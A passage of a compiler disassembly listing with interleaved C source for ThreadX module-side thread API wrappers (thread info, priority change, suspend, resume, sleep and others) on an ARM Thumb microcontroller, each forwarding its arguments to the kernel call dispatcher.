 80210ee:	4618      	mov	r0, r3
 80210f0:	3714      	adds	r7, #20
 80210f2:	46bd      	mov	sp, r7
 80210f4:	bd90      	pop	{r4, r7, pc}
 80210f6:	bf00      	nop
 80210f8:	00000004 	.word	0x00000004

080210fc <_txe_thread_entry_exit_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_entry_exit_notify(TX_THREAD *thread_ptr, VOID (*thread_entry_exit_notify)(TX_THREAD *notify_thread_ptr, UINT type))
{
 80210fc:	b590      	push	{r4, r7, lr}
 80210fe:	b085      	sub	sp, #20
 8021100:	af00      	add	r7, sp, #0
 8021102:	6078      	str	r0, [r7, #4]
 8021104:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_ENTRY_EXIT_NOTIFY_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) thread_entry_exit_notify, 0);
 8021106:	4b07      	ldr	r3, [pc, #28]	; (8021124 <_txe_thread_entry_exit_notify+0x28>)
 8021108:	f859 3003 	ldr.w	r3, [r9, r3]
 802110c:	681c      	ldr	r4, [r3, #0]
 802110e:	6879      	ldr	r1, [r7, #4]
 8021110:	683a      	ldr	r2, [r7, #0]
 8021112:	2300      	movs	r3, #0
 8021114:	2039      	movs	r0, #57	; 0x39
 8021116:	47a0      	blx	r4
 8021118:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802111a:	68fb      	ldr	r3, [r7, #12]
}
 802111c:	4618      	mov	r0, r3
 802111e:	3714      	adds	r7, #20
 8021120:	46bd      	mov	sp, r7
 8021122:	bd90      	pop	{r4, r7, pc}
 8021124:	00000004 	.word	0x00000004

08021128 <_tx_thread_identify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
TX_THREAD *_tx_thread_identify(VOID)
{
 8021128:	b590      	push	{r4, r7, lr}
 802112a:	b083      	sub	sp, #12
 802112c:	af00      	add	r7, sp, #0

TX_THREAD *return_value;

    /* Call module manager dispatcher.  */
    return_value = (TX_THREAD *) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_IDENTIFY_CALL, 0, 0, 0);
 802112e:	4b08      	ldr	r3, [pc, #32]	; (8021150 <_tx_thread_identify+0x28>)
 8021130:	f859 3003 	ldr.w	r3, [r9, r3]
 8021134:	681c      	ldr	r4, [r3, #0]
 8021136:	2300      	movs	r3, #0
 8021138:	2200      	movs	r2, #0
 802113a:	2100      	movs	r1, #0
 802113c:	203a      	movs	r0, #58	; 0x3a
 802113e:	47a0      	blx	r4
 8021140:	4603      	mov	r3, r0
 8021142:	607b      	str	r3, [r7, #4]

    /* Return value to the caller.  */
    return(return_value);
 8021144:	687b      	ldr	r3, [r7, #4]
}
 8021146:	4618      	mov	r0, r3
 8021148:	370c      	adds	r7, #12
 802114a:	46bd      	mov	sp, r7
 802114c:	bd90      	pop	{r4, r7, pc}
 802114e:	bf00      	nop
 8021150:	00000004 	.word	0x00000004

08021154 <_txe_thread_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_info_get(TX_THREAD *thread_ptr, CHAR **name, UINT *state, ULONG *run_count, UINT *priority, UINT *preemption_threshold, ULONG *time_slice, TX_THREAD **next_thread, TX_THREAD **next_suspended_thread)
{
 8021154:	b590      	push	{r4, r7, lr}
 8021156:	b08d      	sub	sp, #52	; 0x34
 8021158:	af00      	add	r7, sp, #0
 802115a:	60f8      	str	r0, [r7, #12]
 802115c:	60b9      	str	r1, [r7, #8]
 802115e:	607a      	str	r2, [r7, #4]
 8021160:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[7];

    extra_parameters[0] = (ALIGN_TYPE) state;
 8021162:	687b      	ldr	r3, [r7, #4]
 8021164:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) run_count;
 8021166:	683b      	ldr	r3, [r7, #0]
 8021168:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) priority;
 802116a:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 802116c:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) preemption_threshold;
 802116e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8021170:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) time_slice;
 8021172:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8021174:	623b      	str	r3, [r7, #32]
    extra_parameters[5] = (ALIGN_TYPE) next_thread;
 8021176:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8021178:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[6] = (ALIGN_TYPE) next_suspended_thread;
 802117a:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 802117c:	62bb      	str	r3, [r7, #40]	; 0x28

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_INFO_GET_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 802117e:	4b08      	ldr	r3, [pc, #32]	; (80211a0 <_txe_thread_info_get+0x4c>)
 8021180:	f859 3003 	ldr.w	r3, [r9, r3]
 8021184:	681c      	ldr	r4, [r3, #0]
 8021186:	68f9      	ldr	r1, [r7, #12]
 8021188:	68ba      	ldr	r2, [r7, #8]
 802118a:	f107 0310 	add.w	r3, r7, #16
 802118e:	203b      	movs	r0, #59	; 0x3b
 8021190:	47a0      	blx	r4
 8021192:	62f8      	str	r0, [r7, #44]	; 0x2c

    /* Return value to the caller.  */
    return(return_value);
 8021194:	6afb      	ldr	r3, [r7, #44]	; 0x2c
}
 8021196:	4618      	mov	r0, r3
 8021198:	3734      	adds	r7, #52	; 0x34
 802119a:	46bd      	mov	sp, r7
 802119c:	bd90      	pop	{r4, r7, pc}
 802119e:	bf00      	nop
 80211a0:	00000004 	.word	0x00000004

080211a4 <_tx_thread_interrupt_control>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_interrupt_control(UINT new_posture)
{
 80211a4:	b590      	push	{r4, r7, lr}
 80211a6:	b085      	sub	sp, #20
 80211a8:	af00      	add	r7, sp, #0
 80211aa:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_INTERRUPT_CONTROL_CALL, (ALIGN_TYPE) new_posture, 0, 0);
 80211ac:	4b07      	ldr	r3, [pc, #28]	; (80211cc <_tx_thread_interrupt_control+0x28>)
 80211ae:	f859 3003 	ldr.w	r3, [r9, r3]
 80211b2:	681c      	ldr	r4, [r3, #0]
 80211b4:	2300      	movs	r3, #0
 80211b6:	2200      	movs	r2, #0
 80211b8:	6879      	ldr	r1, [r7, #4]
 80211ba:	2019      	movs	r0, #25
 80211bc:	47a0      	blx	r4
 80211be:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80211c0:	68fb      	ldr	r3, [r7, #12]
}
 80211c2:	4618      	mov	r0, r3
 80211c4:	3714      	adds	r7, #20
 80211c6:	46bd      	mov	sp, r7
 80211c8:	bd90      	pop	{r4, r7, pc}
 80211ca:	bf00      	nop
 80211cc:	00000004 	.word	0x00000004

080211d0 <_tx_thread_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_performance_info_get(TX_THREAD *thread_ptr, ULONG *resumptions, ULONG *suspensions, ULONG *solicited_preemptions, ULONG *interrupt_preemptions, ULONG *priority_inversions, ULONG *time_slices, ULONG *relinquishes, ULONG *timeouts, ULONG *wait_aborts, TX_THREAD **last_preempted_by)
{
 80211d0:	b590      	push	{r4, r7, lr}
 80211d2:	b08f      	sub	sp, #60	; 0x3c
 80211d4:	af00      	add	r7, sp, #0
 80211d6:	60f8      	str	r0, [r7, #12]
 80211d8:	60b9      	str	r1, [r7, #8]
 80211da:	607a      	str	r2, [r7, #4]
 80211dc:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[9];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 80211de:	687b      	ldr	r3, [r7, #4]
 80211e0:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) solicited_preemptions;
 80211e2:	683b      	ldr	r3, [r7, #0]
 80211e4:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) interrupt_preemptions;
 80211e6:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80211e8:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) priority_inversions;
 80211ea:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 80211ec:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) time_slices;
 80211ee:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80211f0:	623b      	str	r3, [r7, #32]
    extra_parameters[5] = (ALIGN_TYPE) relinquishes;
 80211f2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80211f4:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[6] = (ALIGN_TYPE) timeouts;
 80211f6:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80211f8:	62bb      	str	r3, [r7, #40]	; 0x28
    extra_parameters[7] = (ALIGN_TYPE) wait_aborts;
 80211fa:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80211fc:	62fb      	str	r3, [r7, #44]	; 0x2c
    extra_parameters[8] = (ALIGN_TYPE) last_preempted_by;
 80211fe:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 8021200:	633b      	str	r3, [r7, #48]	; 0x30

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) resumptions, (ALIGN_TYPE) extra_parameters);
 8021202:	4b08      	ldr	r3, [pc, #32]	; (8021224 <_tx_thread_performance_info_get+0x54>)
 8021204:	f859 3003 	ldr.w	r3, [r9, r3]
 8021208:	681c      	ldr	r4, [r3, #0]
 802120a:	68f9      	ldr	r1, [r7, #12]
 802120c:	68ba      	ldr	r2, [r7, #8]
 802120e:	f107 0310 	add.w	r3, r7, #16
 8021212:	203c      	movs	r0, #60	; 0x3c
 8021214:	47a0      	blx	r4
 8021216:	6378      	str	r0, [r7, #52]	; 0x34

    /* Return value to the caller.  */
    return(return_value);
 8021218:	6b7b      	ldr	r3, [r7, #52]	; 0x34
}
 802121a:	4618      	mov	r0, r3
 802121c:	373c      	adds	r7, #60	; 0x3c
 802121e:	46bd      	mov	sp, r7
 8021220:	bd90      	pop	{r4, r7, pc}
 8021222:	bf00      	nop
 8021224:	00000004 	.word	0x00000004

08021228 <_tx_thread_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_performance_system_info_get(ULONG *resumptions, ULONG *suspensions, ULONG *solicited_preemptions, ULONG *interrupt_preemptions, ULONG *priority_inversions, ULONG *time_slices, ULONG *relinquishes, ULONG *timeouts, ULONG *wait_aborts, ULONG *non_idle_returns, ULONG *idle_returns)
{
 8021228:	b590      	push	{r4, r7, lr}
 802122a:	b08f      	sub	sp, #60	; 0x3c
 802122c:	af00      	add	r7, sp, #0
 802122e:	60f8      	str	r0, [r7, #12]
 8021230:	60b9      	str	r1, [r7, #8]
 8021232:	607a      	str	r2, [r7, #4]
 8021234:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[9];

    extra_parameters[0] = (ALIGN_TYPE) solicited_preemptions;
 8021236:	687b      	ldr	r3, [r7, #4]
 8021238:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) interrupt_preemptions;
 802123a:	683b      	ldr	r3, [r7, #0]
 802123c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) priority_inversions;
 802123e:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8021240:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) time_slices;
 8021242:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8021244:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) relinquishes;
 8021246:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8021248:	623b      	str	r3, [r7, #32]
    extra_parameters[5] = (ALIGN_TYPE) timeouts;
 802124a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 802124c:	627b      	str	r3, [r7, #36]	; 0x24
    extra_parameters[6] = (ALIGN_TYPE) wait_aborts;
 802124e:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8021250:	62bb      	str	r3, [r7, #40]	; 0x28
    extra_parameters[7] = (ALIGN_TYPE) non_idle_returns;
 8021252:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8021254:	62fb      	str	r3, [r7, #44]	; 0x2c
    extra_parameters[8] = (ALIGN_TYPE) idle_returns;
 8021256:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 8021258:	633b      	str	r3, [r7, #48]	; 0x30

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) resumptions, (ALIGN_TYPE) suspensions, (ALIGN_TYPE) extra_parameters);
 802125a:	4b08      	ldr	r3, [pc, #32]	; (802127c <_tx_thread_performance_system_info_get+0x54>)
 802125c:	f859 3003 	ldr.w	r3, [r9, r3]
 8021260:	681c      	ldr	r4, [r3, #0]
 8021262:	68f9      	ldr	r1, [r7, #12]
 8021264:	68ba      	ldr	r2, [r7, #8]
 8021266:	f107 0310 	add.w	r3, r7, #16
 802126a:	203d      	movs	r0, #61	; 0x3d
 802126c:	47a0      	blx	r4
 802126e:	6378      	str	r0, [r7, #52]	; 0x34

    /* Return value to the caller.  */
    return(return_value);
 8021270:	6b7b      	ldr	r3, [r7, #52]	; 0x34
}
 8021272:	4618      	mov	r0, r3
 8021274:	373c      	adds	r7, #60	; 0x3c
 8021276:	46bd      	mov	sp, r7
 8021278:	bd90      	pop	{r4, r7, pc}
 802127a:	bf00      	nop
 802127c:	00000004 	.word	0x00000004

08021280 <_txe_thread_preemption_change>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_preemption_change(TX_THREAD *thread_ptr, UINT new_threshold, UINT *old_threshold)
{
 8021280:	b590      	push	{r4, r7, lr}
 8021282:	b087      	sub	sp, #28
 8021284:	af00      	add	r7, sp, #0
 8021286:	60f8      	str	r0, [r7, #12]
 8021288:	60b9      	str	r1, [r7, #8]
 802128a:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_PREEMPTION_CHANGE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) new_threshold, (ALIGN_TYPE) old_threshold);
 802128c:	4b07      	ldr	r3, [pc, #28]	; (80212ac <_txe_thread_preemption_change+0x2c>)
 802128e:	f859 3003 	ldr.w	r3, [r9, r3]
 8021292:	681c      	ldr	r4, [r3, #0]
 8021294:	68f9      	ldr	r1, [r7, #12]
 8021296:	687b      	ldr	r3, [r7, #4]
 8021298:	68ba      	ldr	r2, [r7, #8]
 802129a:	203e      	movs	r0, #62	; 0x3e
 802129c:	47a0      	blx	r4
 802129e:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 80212a0:	697b      	ldr	r3, [r7, #20]
}
 80212a2:	4618      	mov	r0, r3
 80212a4:	371c      	adds	r7, #28
 80212a6:	46bd      	mov	sp, r7
 80212a8:	bd90      	pop	{r4, r7, pc}
 80212aa:	bf00      	nop
 80212ac:	00000004 	.word	0x00000004

080212b0 <_txe_thread_priority_change>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_priority_change(TX_THREAD *thread_ptr, UINT new_priority, UINT *old_priority)
{
 80212b0:	b590      	push	{r4, r7, lr}
 80212b2:	b087      	sub	sp, #28
 80212b4:	af00      	add	r7, sp, #0
 80212b6:	60f8      	str	r0, [r7, #12]
 80212b8:	60b9      	str	r1, [r7, #8]
 80212ba:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_PRIORITY_CHANGE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) new_priority, (ALIGN_TYPE) old_priority);
 80212bc:	4b07      	ldr	r3, [pc, #28]	; (80212dc <_txe_thread_priority_change+0x2c>)
 80212be:	f859 3003 	ldr.w	r3, [r9, r3]
 80212c2:	681c      	ldr	r4, [r3, #0]
 80212c4:	68f9      	ldr	r1, [r7, #12]
 80212c6:	687b      	ldr	r3, [r7, #4]
 80212c8:	68ba      	ldr	r2, [r7, #8]
 80212ca:	203f      	movs	r0, #63	; 0x3f
 80212cc:	47a0      	blx	r4
 80212ce:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 80212d0:	697b      	ldr	r3, [r7, #20]
}
 80212d2:	4618      	mov	r0, r3
 80212d4:	371c      	adds	r7, #28
 80212d6:	46bd      	mov	sp, r7
 80212d8:	bd90      	pop	{r4, r7, pc}
 80212da:	bf00      	nop
 80212dc:	00000004 	.word	0x00000004

080212e0 <_txe_thread_relinquish>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _txe_thread_relinquish(VOID)
{
 80212e0:	b598      	push	{r3, r4, r7, lr}
 80212e2:	af00      	add	r7, sp, #0


    /* Call module manager dispatcher.  */
    (_txm_module_kernel_call_dispatcher)(TXM_THREAD_RELINQUISH_CALL, 0, 0, 0);
 80212e4:	4b05      	ldr	r3, [pc, #20]	; (80212fc <_txe_thread_relinquish+0x1c>)
 80212e6:	f859 3003 	ldr.w	r3, [r9, r3]
 80212ea:	681c      	ldr	r4, [r3, #0]
 80212ec:	2300      	movs	r3, #0
 80212ee:	2200      	movs	r2, #0
 80212f0:	2100      	movs	r1, #0
 80212f2:	2040      	movs	r0, #64	; 0x40
 80212f4:	47a0      	blx	r4
}
 80212f6:	bf00      	nop
 80212f8:	bd98      	pop	{r3, r4, r7, pc}
 80212fa:	bf00      	nop
 80212fc:	00000004 	.word	0x00000004

08021300 <_txe_thread_reset>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_reset(TX_THREAD *thread_ptr)
{
 8021300:	b590      	push	{r4, r7, lr}
 8021302:	b085      	sub	sp, #20
 8021304:	af00      	add	r7, sp, #0
 8021306:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_RESET_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8021308:	4b07      	ldr	r3, [pc, #28]	; (8021328 <_txe_thread_reset+0x28>)
 802130a:	f859 3003 	ldr.w	r3, [r9, r3]
 802130e:	681c      	ldr	r4, [r3, #0]
 8021310:	6879      	ldr	r1, [r7, #4]
 8021312:	2300      	movs	r3, #0
 8021314:	2200      	movs	r2, #0
 8021316:	2041      	movs	r0, #65	; 0x41
 8021318:	47a0      	blx	r4
 802131a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802131c:	68fb      	ldr	r3, [r7, #12]
}
 802131e:	4618      	mov	r0, r3
 8021320:	3714      	adds	r7, #20
 8021322:	46bd      	mov	sp, r7
 8021324:	bd90      	pop	{r4, r7, pc}
 8021326:	bf00      	nop
 8021328:	00000004 	.word	0x00000004

0802132c <_txe_thread_resume>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_resume(TX_THREAD *thread_ptr)
{
 802132c:	b590      	push	{r4, r7, lr}
 802132e:	b085      	sub	sp, #20
 8021330:	af00      	add	r7, sp, #0
 8021332:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_RESUME_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 8021334:	4b07      	ldr	r3, [pc, #28]	; (8021354 <_txe_thread_resume+0x28>)
 8021336:	f859 3003 	ldr.w	r3, [r9, r3]
 802133a:	681c      	ldr	r4, [r3, #0]
 802133c:	6879      	ldr	r1, [r7, #4]
 802133e:	2300      	movs	r3, #0
 8021340:	2200      	movs	r2, #0
 8021342:	2042      	movs	r0, #66	; 0x42
 8021344:	47a0      	blx	r4
 8021346:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021348:	68fb      	ldr	r3, [r7, #12]
}
 802134a:	4618      	mov	r0, r3
 802134c:	3714      	adds	r7, #20
 802134e:	46bd      	mov	sp, r7
 8021350:	bd90      	pop	{r4, r7, pc}
 8021352:	bf00      	nop
 8021354:	00000004 	.word	0x00000004

08021358 <_tx_thread_sleep>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_sleep(ULONG timer_ticks)
{
 8021358:	b590      	push	{r4, r7, lr}
 802135a:	b085      	sub	sp, #20
 802135c:	af00      	add	r7, sp, #0
 802135e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_SLEEP_CALL, (ALIGN_TYPE) timer_ticks, 0, 0);
 8021360:	4b07      	ldr	r3, [pc, #28]	; (8021380 <_tx_thread_sleep+0x28>)
 8021362:	f859 3003 	ldr.w	r3, [r9, r3]
 8021366:	681c      	ldr	r4, [r3, #0]
 8021368:	2300      	movs	r3, #0
 802136a:	2200      	movs	r2, #0
 802136c:	6879      	ldr	r1, [r7, #4]
 802136e:	2043      	movs	r0, #67	; 0x43
 8021370:	47a0      	blx	r4
 8021372:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8021374:	68fb      	ldr	r3, [r7, #12]
}
 8021376:	4618      	mov	r0, r3
 8021378:	3714      	adds	r7, #20
 802137a:	46bd      	mov	sp, r7
 802137c:	bd90      	pop	{r4, r7, pc}
 802137e:	bf00      	nop
 8021380:	00000004 	.word	0x00000004

08021384 <_tx_thread_stack_error_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_thread_stack_error_notify(VOID (*stack_error_handler)(TX_THREAD *thread_ptr))
{
 8021384:	b590      	push	{r4, r7, lr}
 8021386:	b085      	sub	sp, #20
 8021388:	af00      	add	r7, sp, #0
 802138a:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_STACK_ERROR_NOTIFY_CALL, (ALIGN_TYPE) stack_error_handler, 0, 0);
 802138c:	4b07      	ldr	r3, [pc, #28]	; (80213ac <_tx_thread_stack_error_notify+0x28>)
 802138e:	f859 3003 	ldr.w	r3, [r9, r3]
 8021392:	681c      	ldr	r4, [r3, #0]
 8021394:	6879      	ldr	r1, [r7, #4]
 8021396:	2300      	movs	r3, #0
 8021398:	2200      	movs	r2, #0
 802139a:	2044      	movs	r0, #68	; 0x44
 802139c:	47a0      	blx	r4
 802139e:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80213a0:	68fb      	ldr	r3, [r7, #12]
}
 80213a2:	4618      	mov	r0, r3
 80213a4:	3714      	adds	r7, #20
 80213a6:	46bd      	mov	sp, r7
 80213a8:	bd90      	pop	{r4, r7, pc}
 80213aa:	bf00      	nop
 80213ac:	00000004 	.word	0x00000004

080213b0 <_txe_thread_suspend>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_suspend(TX_THREAD *thread_ptr)
{
 80213b0:	b590      	push	{r4, r7, lr}
 80213b2:	b085      	sub	sp, #20
 80213b4:	af00      	add	r7, sp, #0
 80213b6:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_SUSPEND_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 80213b8:	4b07      	ldr	r3, [pc, #28]	; (80213d8 <_txe_thread_suspend+0x28>)
 80213ba:	f859 3003 	ldr.w	r3, [r9, r3]
 80213be:	681c      	ldr	r4, [r3, #0]
 80213c0:	6879      	ldr	r1, [r7, #4]
 80213c2:	2300      	movs	r3, #0
 80213c4:	2200      	movs	r2, #0
 80213c6:	2045      	movs	r0, #69	; 0x45
 80213c8:	47a0      	blx	r4
 80213ca:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80213cc:	68fb      	ldr	r3, [r7, #12]
}
 80213ce:	4618      	mov	r0, r3
 80213d0:	3714      	adds	r7, #20
 80213d2:	46bd      	mov	sp, r7
 80213d4:	bd90      	pop	{r4, r7, pc}
 80213d6:	bf00      	nop
 80213d8:	00000004 	.word	0x00000004

080213dc <_txe_thread_terminate>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_terminate(TX_THREAD *thread_ptr)
{
 80213dc:	b590      	push	{r4, r7, lr}
 80213de:	b085      	sub	sp, #20
 80213e0:	af00      	add	r7, sp, #0
 80213e2:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_TERMINATE_CALL, (ALIGN_TYPE) thread_ptr, 0, 0);
 80213e4:	4b07      	ldr	r3, [pc, #28]	; (8021404 <_txe_thread_terminate+0x28>)
 80213e6:	f859 3003 	ldr.w	r3, [r9, r3]
 80213ea:	681c      	ldr	r4, [r3, #0]
 80213ec:	6879      	ldr	r1, [r7, #4]
 80213ee:	2300      	movs	r3, #0
 80213f0:	2200      	movs	r2, #0
 80213f2:	2046      	movs	r0, #70	; 0x46
 80213f4:	47a0      	blx	r4
 80213f6:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80213f8:	68fb      	ldr	r3, [r7, #12]
}
 80213fa:	4618      	mov	r0, r3
 80213fc:	3714      	adds	r7, #20
 80213fe:	46bd      	mov	sp, r7
 8021400:	bd90      	pop	{r4, r7, pc}
 8021402:	bf00      	nop
 8021404:	00000004 	.word	0x00000004

08021408 <_txe_thread_time_slice_change>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_time_slice_change(TX_THREAD *thread_ptr, ULONG new_time_slice, ULONG *old_time_slice)
{
 8021408:	b590      	push	{r4, r7, lr}
 802140a:	b087      	sub	sp, #28
 802140c:	af00      	add	r7, sp, #0
 802140e:	60f8      	str	r0, [r7, #12]
 8021410:	60b9      	str	r1, [r7, #8]
 8021412:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_THREAD_TIME_SLICE_CHANGE_CALL, (ALIGN_TYPE) thread_ptr, (ALIGN_TYPE) new_time_slice, (ALIGN_TYPE) old_time_slice);
 8021414:	4b07      	ldr	r3, [pc, #28]	; (8021434 <_txe_thread_time_slice_change+0x2c>)
 8021416:	f859 3003 	ldr.w	r3, [r9, r3]
 802141a:	681c      	ldr	r4, [r3, #0]
 802141c:	68f9      	ldr	r1, [r7, #12]
 802141e:	687b      	ldr	r3, [r7, #4]
 8021420:	68ba      	ldr	r2, [r7, #8]
 8021422:	2047      	movs	r0, #71	; 0x47
 8021424:	47a0      	blx	r4
 8021426:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8021428:	697b      	ldr	r3, [r7, #20]
}
 802142a:	4618      	mov	r0, r3
 802142c:	371c      	adds	r7, #28
 802142e:	46bd      	mov	sp, r7
 8021430:	bd90      	pop	{r4, r7, pc}
 8021432:	bf00      	nop
 8021434:	00000004 	.word	0x00000004

08021438 <_txe_thread_wait_abort>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_thread_wait_abort(TX_THREAD *thread_ptr)
{
 8021438:	b590      	push	{r4, r7, lr}
 802143a:	b085      	sub	sp, #20
 802143c:	af00      	add	r7, sp, #0
 802143e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
